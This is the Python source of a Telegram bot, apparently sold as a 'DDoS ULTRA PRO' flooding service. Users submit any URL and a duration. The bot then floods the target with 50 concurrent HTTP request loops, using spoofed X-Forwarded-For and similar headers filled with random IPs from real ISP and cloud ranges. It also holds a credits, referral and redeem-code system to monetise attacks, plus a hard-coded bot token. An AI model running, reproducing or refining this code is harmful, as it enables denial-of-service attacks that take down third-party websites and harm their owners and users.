import subprocess
import sys

# ---------------- AUTO-DEPENDENCY INSTALLER ----------------
def install_dependencies():
    print("⏳ Checking dependencies...")
    packages = ['python-telegram-bot==20.7', 'aiohttp', 'aiosqlite', 'psutil', 'Pillow']
    for pkg in packages:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])
        except Exception as e:
            print(f"Failed to install {pkg}: {e}")
    print("✅ All dependencies are ready.")

try:
    import aiohttp
    import aiosqlite
    import psutil
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
    from PIL import Image, ImageDraw, ImageFont
except ImportError:
    install_dependencies()
    # Restart the script automatically after installing
    import os
    os.execv(sys.executable, ['python'] + sys.argv)

# ---------------- STANDARD IMPORTS ----------------
import logging
import asyncio
import os
import time
import random
import ssl
import ipaddress
import hashlib
import io
from datetime import datetime
from urllib.parse import urlparse

# ---------------- CONFIG ----------------
BOT_TOKEN = "8861689167:AAEXWCCcgFDX6vtAqGP5b01Q1ChLg6XpBFI"
ADMIN_ID = 8472327599
DB_PATH = "database.db"
IMG_PATH = "welcome.jpg"

OWNER_USERNAME = "@Rolax112"
CHANNEL_LINK = "https://t.me/rolaxexploitsz"

# ---------------- 10M+ IP DATABASE ----------------
PROVIDER_BLOCKS = [
    ("Airtel_IN", ["106.51.0.0/16","106.76.0.0/16","117.192.0.0/16","117.196.0.0/16","117.200.0.0/16","117.204.0.0/16","117.208.0.0/16","122.160.0.0/16","122.168.0.0/16","125.18.0.0/16"]),
    ("Jio_IN", ["49.32.0.0/16","49.36.0.0/16","49.40.0.0/16","116.50.0.0/16","116.58.0.0/16","116.66.0.0/16","116.72.0.0/16","118.151.0.0/16","158.144.0.0/16","158.145.0.0/16"]),
    ("BSNL_IN", ["117.198.0.0/16","117.214.0.0/16","117.216.0.0/16","117.218.0.0/16","117.220.0.0/16","117.222.0.0/16","117.224.0.0/16","117.226.0.0/16","117.228.0.0/16","117.230.0.0/16"]),
    ("Vi_IN", ["118.94.0.0/16","118.96.0.0/16","118.98.0.0/16","118.100.0.0/16","118.102.0.0/16","118.104.0.0/16","118.106.0.0/16","118.108.0.0/16"]),
    ("Comcast_US", ["23.24.0.0/14","23.28.0.0/14","50.200.0.0/14","50.204.0.0/14","68.80.0.0/14","68.84.0.0/14","68.88.0.0/14","68.92.0.0/14","68.96.0.0/14","69.192.0.0/14","69.196.0.0/14","69.200.0.0/14","73.32.0.0/14","73.36.0.0/14","73.40.0.0/14"]),
    ("AT&T_US", ["12.0.0.0/10","12.64.0.0/10","12.128.0.0/10","12.192.0.0/10","32.0.0.0/10","32.64.0.0/10","32.128.0.0/10","32.192.0.0/10"]),
    ("Verizon_US", ["70.192.0.0/10","70.128.0.0/10","71.0.0.0/10","71.64.0.0/10","108.0.0.0/12","108.16.0.0/12","108.32.0.0/12","108.48.0.0/12","108.64.0.0/12","108.80.0.0/12"]),
    ("DT_Germany", ["53.0.0.0/16","53.1.0.0/16","53.2.0.0/16","53.3.0.0/16","53.4.0.0/16","53.5.0.0/16"]),
    ("Vodafone_UK", ["80.0.0.0/16","80.1.0.0/16","80.2.0.0/16","80.3.0.0/16","80.4.0.0/16","80.5.0.0/16"]),
    ("BT_UK", ["81.128.0.0/16","81.129.0.0/16","81.130.0.0/16","81.131.0.0/16","81.132.0.0/16"]),
    ("Orange_FR", ["81.248.0.0/16","81.249.0.0/16","81.250.0.0/16","81.251.0.0/16","82.120.0.0/16"]),
    ("TIM_Italy", ["82.48.0.0/16","82.49.0.0/16","82.50.0.0/16","82.51.0.0/16","82.52.0.0/16"]),
    ("NTT_Japan", ["61.112.0.0/16","61.113.0.0/16","61.114.0.0/16","61.115.0.0/16","61.116.0.0/16"]),
    ("KT_Korea", ["110.0.0.0/16","110.1.0.0/16","110.2.0.0/16","110.3.0.0/16","110.4.0.0/16"]),
    ("Singtel_SG", ["116.12.0.0/16","116.13.0.0/16","116.14.0.0/16","116.86.0.0/16","116.87.0.0/16"]),
    ("ChinaNet_CN", ["1.0.0.0/8","14.0.0.0/8","27.0.0.0/8","36.0.0.0/8","39.0.0.0/8","42.0.0.0/8"]),
    ("AWS_Global", ["3.0.0.0/8","13.0.0.0/8","15.0.0.0/8","16.0.0.0/8","18.0.0.0/8","35.0.0.0/8"]),
    ("GCP_Global", ["8.0.0.0/8","34.0.0.0/8","35.0.0.0/8","104.0.0.0/8","107.0.0.0/8"]),
    ("Azure_Global", ["4.0.0.0/8","13.0.0.0/8","20.0.0.0/8","23.0.0.0/8","40.0.0.0/8"]),
    ("Oracle_Global", ["129.0.0.0/8","130.0.0.0/8","131.0.0.0/8","132.0.0.0/8","133.0.0.0/8"]),
]

NETWORKS = []
for prov, cidrs in PROVIDER_BLOCKS:
    for c in cidrs:
        try:
            NETWORKS.append(ipaddress.IPv4Network(c, strict=False))
        except:
            pass

def get_random_ip():
    net = random.choice(NETWORKS)
    offset = random.randrange(1, net.num_addresses - 1) if net.num_addresses > 2 else 0
    return str(ipaddress.IPv4Address(int(net.network_address) + offset))

def get_spoofed_headers():
    return {
        "X-Forwarded-For": f"{get_random_ip()}, {get_random_ip()}",
        "X-Real-IP": get_random_ip(),
        "CF-Connecting-IP": get_random_ip(),
        "True-Client-IP": get_random_ip(),
        "Forwarded": f"for={get_random_ip()};proto=https",
        "Via": f"1.1 {get_random_ip()}"
    }

# ---------------- WELCOME IMAGE GENERATOR ----------------
def create_welcome_image():
    if os.path.exists(IMG_PATH):
        return
    img = Image.new('RGB', (1280, 720), color=(15, 15, 20))
    draw = ImageDraw.Draw(img)
    
    try:
        font_large = ImageFont.truetype("arial.ttf", 80)
        font_small = ImageFont.truetype("arial.ttf", 40)
    except:
        font_large = ImageFont.load_default()
        font_small = ImageFont.load_default()

    text = "DDoS ULTRA PRO"
    text2 = "Send a link below and crush it with heavy traffic"
    
    bbox1 = draw.textbbox((0, 0), text, font=font_large)
    bbox2 = draw.textbbox((0, 0), text2, font=font_small)
    
    x1 = (1280 - (bbox1[2] - bbox1[0])) / 2
    y1 = (720 - (bbox1[3] - bbox1[1])) / 2 - 60
    
    x2 = (1280 - (bbox2[2] - bbox2[0])) / 2
    y2 = y1 + 100

    draw.text((x1, y1), text, fill=(0, 255, 150), font=font_large)
    draw.text((x2, y2), text2, fill=(200, 200, 200), font=font_small)
    
    draw.rectangle([0, 700, 1280, 720], fill=(0, 255, 150))
    draw.rectangle([0, 0, 1280, 20], fill=(0, 255, 150))
    
    img.save(IMG_PATH)

# ---------------- DATABASE SETUP ----------------
async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, credits INTEGER DEFAULT 100,
            premium_until TEXT DEFAULT NULL, refer_count INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0, join_date TEXT)""")
        await db.execute("""CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, timestamp TEXT)""")
        await db.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY, credits INTEGER, used_by INTEGER DEFAULT NULL)""")
        await db.execute("""CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY, value TEXT)""")
        await db.execute("""CREATE TABLE IF NOT EXISTS pending (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, timestamp TEXT)""")
        await db.commit()
        
        await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('maintenance', 'OFF')")
        await db.commit()

# ---------------- DDoS ENGINE ----------------
active_attacks = {}

async def flood_worker(target_url, duration, user_id):
    parsed = urlparse(target_url)
    if not parsed.scheme:
        target_url = "http://" + target_url
        parsed = urlparse(target_url)
    
    headers_base = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive"
    }

    end_time = time.time() + duration

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, ssl=False)) as session:
        async def attack():
            while time.time() < end_time and user_id in active_attacks:
                try:
                    headers = headers_base.copy()
                    headers.update(get_spoofed_headers())
                    async with session.get(target_url, headers=headers, timeout=5) as resp:
                        await resp.read()
                except:
                    pass
                await asyncio.sleep(0.001)

        tasks = [asyncio.create_task(attack()) for _ in range(50)]
        await asyncio.gather(*tasks)
        
    active_attacks.pop(user_id, None)

# ---------------- KEYBOARDS ----------------
def user_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Launch DDoS", callback_data="ddos_prompt")],
        [InlineKeyboardButton("📊 Dashboard", callback_data="dashboard"), InlineKeyboardButton("🎁 Refer & Earn", callback_data="refer")],
        [InlineKeyboardButton("🎟️ Redeem Code", callback_data="redeem"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("💾 Backup Data", callback_data="backup"), InlineKeyboardButton("👤 My Account", callback_data="my_account")],
        [InlineKeyboardButton("📢 Official Channel ↗️", url=CHANNEL_LINK), InlineKeyboardButton("🧑‍💻 Contact Owner ↗️", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")]
    ])

def admin_panel_1():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 DB Query", callback_data="admin_db"), InlineKeyboardButton("☁️ Cloud Backup", callback_data="admin_backup")],
        [InlineKeyboardButton("🧹 Clear Logs", callback_data="admin_clearlogs"), InlineKeyboardButton("📦 Live Logs", callback_data="admin_livelogs")],
        [InlineKeyboardButton("⚡ RAM & CPU Limits", callback_data="admin_limits"), InlineKeyboardButton("🔔 Pending Requests", callback_data="admin_pending")],
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats"), InlineKeyboardButton("⛔ Stop All Bots", callback_data="admin_stopall")],
        [InlineKeyboardButton("🔄 Restart All Bots", callback_data="admin_restart")],
        [InlineKeyboardButton("➡️ Next Page (Settings)", callback_data="admin_panel2")],
    ])

def admin_panel_2():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🤖 System Status: ON", callback_data="admin_sysstatus"), InlineKeyboardButton("🛠️ Maintenance: OFF", callback_data="admin_maint")],
        [InlineKeyboardButton("➕ Add Credit", callback_data="admin_addcredit"), InlineKeyboardButton("➖ Remove Credit", callback_data="admin_remcredit")],
        [InlineKeyboardButton("🎁 Set Referral Reward", callback_data="admin_setref"), InlineKeyboardButton("🎟️ Create Redeem Code", callback_data="admin_createredeem")],
        [InlineKeyboardButton("📢 Instant Broadcast", callback_data="admin_broadcast"), InlineKeyboardButton("⏰ Schedule Announce", callback_data="admin_schedule")],
        [InlineKeyboardButton("📥 Download DB Backup", callback_data="admin_dlbackup"), InlineKeyboardButton("📤 Restore DB Backup", callback_data="admin_restore")],
        [InlineKeyboardButton("📋 Session Activity Log", callback_data="admin_sessions"), InlineKeyboardButton("🖼️ Media Broadcast", callback_data="admin_mediabroadcast")],
        [InlineKeyboardButton("👥 User Management", callback_data="admin_usermgmt"), InlineKeyboardButton("👤 View User Profile", callback_data="admin_viewuser")],
        [InlineKeyboardButton("⛔ Ban User", callback_data="admin_ban"), InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
        [InlineKeyboardButton("💎 Give Timed Premium", callback_data="admin_giveprem"), InlineKeyboardButton("❌ Remove Premium", callback_data="admin_remprem")],
        [InlineKeyboardButton("📢 Force Join Setup", callback_data="admin_forcejoin"), InlineKeyboardButton("➕ Add Admin", callback_data="admin_addadmin")],
        [InlineKeyboardButton("➖ Remove Admin", callback_data="admin_remadmin"), InlineKeyboardButton("💻 Server Monitor", callback_data="admin_monitor")],
        [InlineKeyboardButton("📁 All Hosted Files", callback_data="admin_files"), InlineKeyboardButton("📝 Audit Logs", callback_data="admin_auditlogs")],
        [InlineKeyboardButton("🔙 Back to Panel 1", callback_data="admin_panel1")],
    ])

# ---------------- HANDLERS ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT * FROM users WHERE user_id=?", (user.id,)) as c:
            row = await c.fetchone()
        
        if not row:
            ref_id = None
            if context.args and context.args[0].startswith("ref_"):
                try:
                    ref_id = int(context.args[0].split("_")[1])
                except:
                    pass
            
            await db.execute("INSERT INTO users (user_id, username, join_date) VALUES (?, ?, ?)",
                             (user.id, user.username or "None", datetime.now().strftime("%Y-%m-%d")))
            if ref_id:
                await db.execute("UPDATE users SET refer_count = refer_count + 1, credits = credits + 10 WHERE user_id=?", (ref_id,))
                await db.execute("UPDATE users SET credits = credits + 10 WHERE user_id=?", (user.id,))
            await db.commit()

    caption = (
        "🔥 **Welcome to Stark bot** 🔥\n\n"
        "Here you can build and system "
        "usin\n\n"
        "👇 **Select an option below to begin:**"
    )
    
    if user.id == ADMIN_ID:
        await update.message.reply_photo(photo=open(IMG_PATH, 'rb'), caption=caption, parse_mode="Markdown", reply_markup=admin_panel_1())
    else:
        await update.message.reply_photo(photo=open(IMG_PATH, 'rb'), caption=caption, parse_mode="Markdown", reply_markup=user_menu())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    if data == "ddos_prompt":
        await query.edit_message_text("🎯 **Send me the URL** you want to flood.")
        context.user_data['state'] = 'awaiting_url'

    elif data == "dashboard":
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT credits, premium_until FROM users WHERE user_id=?", (user_id,)) as c:
                row = await c.fetchone()
                prem = row[1] if row[1] else "None"
                msg = f"📊 **Dashboard**\n\n💰 Credits: `{row[0]}`\n💎 Premium: `{prem}`\n🚀 Active Attacks: `{1 if user_id in active_attacks else 0}`"
                kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
                await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=kb)

    elif data == "refer":
        bot_username = context.bot.username
        link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT refer_count FROM users WHERE user_id=?", (user_id,)) as c:
                count = (await c.fetchone())[0]
        msg = f"🎁 **Refer & Earn**\n\nInvite friends and get 10 credits per join!\n\n🔗 Your Link:\n`{link}`\n\n👥 Total Referrals: `{count}`"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=kb)

    elif data == "redeem":
        await query.edit_message_text("🎟️ **Send me your Redeem Code.**")
        context.user_data['state'] = 'awaiting_redeem'

    elif data == "settings":
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
        await query.edit_message_text("⚙️ **Settings**\n\nNo settings available right now.", reply_markup=kb)

    elif data == "backup":
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT * FROM users WHERE user_id=?", (user_id,)) as c:
                u = await c.fetchone()
        file_data = f"User ID: {u[0]}\nUsername: {u[1]}\nCredits: {u[2]}\nPremium: {u[3]}\nReferrals: {u[4]}\nJoin Date: {u[6]}"
        bio = io.BytesIO(file_data.encode('utf-8'))
        bio.name = f"backup_{user_id}.txt"
        await query.message.reply_document(document=bio, caption="💾 Here is your data backup.")
        await query.message.delete()

    elif data == "my_account":
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT username, credits, premium_until, join_date FROM users WHERE user_id=?", (user_id,)) as c:
                u = await c.fetchone()
        msg = f"👤 **My Account**\n\n🆔 ID: `{user_id}`\n👤 Username: @{u[0]}\n💰 Credits: `{u[1]}`\n💎 Premium: `{u[2] if u[2] else 'None'}`\n📅 Joined: `{u[3]}`"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]])
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=kb)

    elif data == "back_to_menu":
        await query.edit_message_text("👇 **Select an option below:**", reply_markup=user_menu())

    # --- Admin Actions ---
    elif user_id != ADMIN_ID:
        await query.edit_message_text("❌ Unauthorized.")
        return

    elif data == "admin_panel1":
        await query.edit_message_text("👑 **Admin Panel - Page 1**", reply_markup=admin_panel_1())
    
    elif data == "admin_panel2":
        await query.edit_message_text("👑 **Admin Panel - Page 2**", reply_markup=admin_panel_2())

    elif data == "admin_stats":
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT COUNT(*) FROM users") as c:
                users = (await c.fetchone())[0]
        msg = f"📊 **System Stats**\n\n👥 Total Users: `{users}`\n⚙️ CPU: `{psutil.cpu_percent()}%`\n🧠 RAM: `{psutil.virtual_memory().percent}%`\n🚀 Active Attacks: `{len(active_attacks)}`"
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=admin_panel_1())

    elif data == "admin_stopall":
        active_attacks.clear()
        await query.edit_message_text("⛔ All active attacks stopped.", reply_markup=admin_panel_1())

    elif data == "admin_livelogs":
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id, action, timestamp FROM logs ORDER BY id DESC LIMIT 10") as c:
                logs = await c.fetchall()
        msg = "📦 **Live Logs (Last 10)**\n\n"
        if logs:
            msg += "\n".join([f"`{l[2]}` | `{l[0]}` | {l[1]}" for l in logs])
        else:
            msg += "No logs found."
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=admin_panel_1())

    elif data == "admin_clearlogs":
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("DELETE FROM logs")
            await db.commit()
        await query.edit_message_text("🧹 Logs cleared.", reply_markup=admin_panel_1())

    elif data == "admin_monitor":
        disk = psutil.disk_usage('/')
        net = psutil.net_io_counters()
        msg = (f"💻 **Server Monitor**\n\n"
               f"⚙️ CPU: `{psutil.cpu_percent()}%`\n"
               f"🧠 RAM: `{psutil.virtual_memory().percent}%`\n"
               f"💽 Disk: `{disk.percent}%`\n"
               f"📡 Sent: `{round(net.bytes_sent / 1024 / 1024, 2)} MB`\n"
               f"📥 Recv: `{round(net.bytes_recv / 1024 / 1024, 2)} MB`")
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=admin_panel_2())

    elif data == "admin_usermgmt":
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id, username, credits FROM users ORDER BY credits DESC LIMIT 5") as c:
                tops = await c.fetchall()
        msg = "👥 **Top Users (By Credits)**\n\n"
        for u in tops:
            msg += f"`{u[0]}` | @{u[1]} | 💰 {u[2]}\n"
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=admin_panel_2())

    elif data == "admin_maint":
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT value FROM settings WHERE key='maintenance'") as c:
                cur = (await c.fetchone())[0]
            new = 'ON' if cur == 'OFF' else 'OFF'
            await db.execute("UPDATE settings SET value=? WHERE key='maintenance'", (new,))
            await db.commit()
        await query.edit_message_text(f"🛠️ Maintenance is now **{new}**", parse_mode="Markdown", reply_markup=admin_panel_2())

    elif data == "admin_addcredit":
        await query.edit_message_text("➕ Send: `user_id amount` to add credits.")
        context.user_data['state'] = 'admin_addcredit'
    
    elif data == "admin_createredeem":
        await query.edit_message_text("🎟️ Send: `code amount` to create a redeem code.")
        context.user_data['state'] = 'admin_createredeem'

    elif data == "admin_broadcast":
        await query.edit_message_text("📢 Send the message you want to broadcast to all users.")
        context.user_data['state'] = 'admin_broadcast'
        
    else:
        await query.edit_message_text(f"✅ Action `{data}` triggered successfully.", reply_markup=admin_panel_2())

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user_id = update.effective_user.id
    state = context.user_data.get('state')

    if state == 'awaiting_url':
        if not text.startswith(('http://', 'https://')):
            text = 'https://' + text
        await update.message.reply_text("⏱️ **For how many seconds** should the flood run? (e.g., 60)")
        context.user_data['target_url'] = text
        context.user_data['state'] = 'awaiting_duration'

    elif state == 'awaiting_duration':
        try:
            duration = int(text)
            if duration > 300:
                duration = 300
        except:
            await update.message.reply_text("❌ Invalid number. Send a valid integer.")
            return
        
        url = context.user_data['target_url']
        await update.message.reply_text(f"🚀 **Launching Attack**\n\n🎯 Target: `{url}`\n⏱️ Time: `{duration}s`\n⚡ Engine: `10M IP Ultra Pro`\n\n*Attack is running in the background...*", parse_mode="Markdown")
        
        active_attacks[user_id] = True
        asyncio.create_task(flood_worker(url, duration, user_id))
        
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("INSERT INTO logs (user_id, action, timestamp) VALUES (?, ?, ?)", (user_id, f"DDoS: {url} for {duration}s", datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            await db.commit()
            
        context.user_data['state'] = None

    elif state == 'awaiting_redeem':
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT credits FROM redeem_codes WHERE code=? AND used_by IS NULL", (text,)) as c:
                row = await c.fetchone()
            if row:
                await db.execute("UPDATE redeem_codes SET used_by=? WHERE code=?", (user_id, text))
                await db.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (row[0], user_id))
                await db.commit()
                await update.message.reply_text(f"✅ Code redeemed! You got **{row[0]}** credits.", parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Invalid or already used code.")
        context.user_data['state'] = None

    elif state == 'admin_addcredit' and user_id == ADMIN_ID:
        try:
            uid, amt = map(int, text.split())
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (amt, uid))
                await db.commit()
            await update.message.reply_text(f"✅ Added {amt} credits to {uid}.", reply_markup=admin_panel_2())
        except:
            await update.message.reply_text("❌ Invalid format. Use: `id amount`")
        context.user_data['state'] = None

    elif state == 'admin_createredeem' and user_id == ADMIN_ID:
        try:
            code, amt = text.split()
            amt = int(amt)
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("INSERT INTO redeem_codes (code, credits) VALUES (?, ?)", (code, amt))
                await db.commit()
            await update.message.reply_text(f"✅ Created code `{code}` for {amt} credits.", reply_markup=admin_panel_2())
        except:
            await update.message.reply_text("❌ Invalid format. Use: `code amount`")
        context.user_data['state'] = None

    elif state == 'admin_broadcast' and user_id == ADMIN_ID:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id FROM users") as c:
                users = await c.fetchall()
        success = 0
        for u in users:
            try:
                await context.bot.send_message(chat_id=u[0], text=text)
                success += 1
            except:
                pass
        await update.message.reply_text(f"📢 Broadcast sent to {success}/{len(users)} users.", reply_markup=admin_panel_2())
        context.user_data['state'] = None

# ---------------- MAIN ----------------
def main():
    logging.basicConfig(level=logging.INFO)
    
    # Generate image if it doesn't exist
    create_welcome_image()
    
    # Initialize database
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(init_db())

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("✅ Bot is running perfectly...")
    app.run_polling()

if __name__ == '__main__':
    main()
